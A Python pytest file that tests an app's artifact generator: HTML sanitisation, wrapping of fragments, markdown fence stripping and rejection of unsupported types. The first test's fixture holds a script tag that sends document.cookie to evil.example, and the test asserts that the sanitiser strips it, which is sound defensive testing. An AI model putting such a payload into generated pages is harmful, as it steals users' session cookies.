import pytest

from app.agents.skills.artifact_generation import generate_artifact
from app.retrieval.retriever import Retriever
from tests.conftest import FakeLLMProvider


@pytest.mark.asyncio
async def test_html_artifact_strips_script_tags(db_session, fake_embedder):
    malicious_response = (
        "<!DOCTYPE html><html><head><title>Report</title></head>"
        "<body><h1>Report</h1><script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
        "<p>Safe content</p></body></html>"
    )
    llm = FakeLLMProvider(response=malicious_response)
    retriever = Retriever(db_session, fake_embedder)

    artifact = await generate_artifact(
        llm=llm, retriever=retriever, history=[], request="Make an HTML report", artifact_type="html"
    )

    assert "<script" not in artifact.content.lower()
    assert "evil.example" not in artifact.content
    assert "Safe content" in artifact.content


@pytest.mark.asyncio
async def test_html_artifact_without_doctype_gets_wrapped(db_session, fake_embedder):
    llm = FakeLLMProvider(response="<p>Just a fragment</p>")
    retriever = Retriever(db_session, fake_embedder)

    artifact = await generate_artifact(
        llm=llm, retriever=retriever, history=[], request="Make a fragment", artifact_type="html"
    )

    assert "<html" in artifact.content.lower()
    assert "<p>Just a fragment</p>" in artifact.content


@pytest.mark.asyncio
async def test_markdown_artifact_strips_surrounding_code_fence(db_session, fake_embedder):
    llm = FakeLLMProvider(response="```markdown\n# Title\n\nBody text here.\n```")
    retriever = Retriever(db_session, fake_embedder)

    artifact = await generate_artifact(
        llm=llm, retriever=retriever, history=[], request="Make a doc", artifact_type="markdown"
    )

    assert artifact.content == "# Title\n\nBody text here."
    assert artifact.title == "Title"


@pytest.mark.asyncio
async def test_unsupported_artifact_type_is_rejected(db_session, fake_embedder):
    from app.core.errors import ArtifactGenerationError

    llm = FakeLLMProvider()
    retriever = Retriever(db_session, fake_embedder)

    with pytest.raises(ArtifactGenerationError):
        await generate_artifact(
            llm=llm, retriever=retriever, history=[], request="anything", artifact_type="pdf"
        )
